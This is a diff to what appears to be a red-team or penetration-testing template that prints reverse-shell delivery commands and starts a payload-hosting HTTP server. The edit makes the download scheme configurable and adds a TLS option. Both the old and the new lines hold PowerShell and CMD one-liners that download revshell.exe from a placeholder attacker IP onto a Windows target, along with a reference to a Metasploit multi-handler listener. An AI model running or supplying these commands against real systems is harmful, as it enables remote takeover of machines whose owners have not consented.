@@ -14,9 +14,9 @@ content: |
   printf '%s\n' 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-tcp-nonstaged.yaml') }}'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  printf '%s\n' 'Deliver only: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                         -----CMD-----                          '; \
-  printf '%s\n' 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  printf '%s\n' 'Deliver only: powershell wget -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/outbound {{ delivery_tls_flag }}
